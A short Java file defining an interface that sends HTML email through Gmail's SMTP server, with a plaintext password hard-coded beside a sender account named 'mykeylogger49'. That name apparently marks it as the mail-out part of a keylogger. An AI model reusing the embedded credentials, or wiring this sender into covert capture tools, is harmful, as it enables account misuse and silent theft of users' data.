package com.ronicy.admin;

import java.util.Date;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public interface SimpleEmailSender {

	static final String SENDER_EMAIL = "mykeylogger49@gmail.com";
	static final String SENDER_NAME = "mykeylogger49@gmail.com";
	static final String PASSWORD = "manukar2";
	static final String HOST = "smtp.gmail.com";
	static final String PORT = "587";

	public static void sendEmail(String recipientEmail, String subject, String message) {

		// sets SMTP server properties
		Properties properties = new Properties();
		properties.put("mail.smtp.host", HOST);
		properties.put("mail.smtp.port", PORT);
		properties.put("mail.smtp.auth", "true");
		properties.put("mail.smtp.starttls.enable", "true");

		// creates a new session with an authenticator
		Authenticator auth = new Authenticator() {
			public PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(SENDER_EMAIL, PASSWORD);
			}
		};

		Session session = Session.getInstance(properties, auth);

		try {
			// creates a new e-mail message
			Message msg = new MimeMessage(session);

			msg.setFrom(new InternetAddress(SENDER_EMAIL, SENDER_NAME));
			InternetAddress[] toAddresses = { new InternetAddress(recipientEmail) };
			msg.setRecipients(Message.RecipientType.TO, toAddresses);
			msg.setSubject(subject);
			msg.setSentDate(new Date());
			msg.setContent(message, "text/html");

			// sends the e-mail
			Transport.send(msg);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
